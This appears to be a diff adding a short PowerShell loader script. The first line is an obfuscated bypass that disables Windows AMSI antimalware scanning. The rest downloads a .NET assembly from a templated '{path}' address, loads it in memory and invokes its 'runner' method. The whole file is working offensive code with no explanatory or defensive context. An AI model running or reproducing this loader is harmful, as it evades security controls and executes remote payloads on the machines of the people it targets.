@@ -1,0 +1,7 @@
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+$data = (New-Object System.Net.WebClient).DownloadData('{path}')
+
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
